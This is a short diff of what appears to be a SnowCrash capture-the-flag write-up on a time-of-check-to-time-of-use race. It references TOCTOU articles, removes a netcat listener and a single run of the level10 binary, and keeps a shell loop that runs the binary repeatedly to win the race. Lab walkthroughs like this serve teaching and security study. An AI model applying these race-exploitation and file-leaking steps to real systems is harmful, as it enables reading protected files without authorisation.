@@ -45,14 +45,6 @@ HOLA
 https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
 https://lucabarile.github.io/Blog/toctou/index.html
 
-    
-
-- console1:
-level10@SnowCrash:~$ ./level10 /tmp/a $(hostname -I)
-
-- console2:
-level10@SnowCrash:~$ nc -l 6969
-
 - condole1:
 level10@SnowCrash:~$ while true; do ./level10 /tmp/a $(hostname -I); done
 
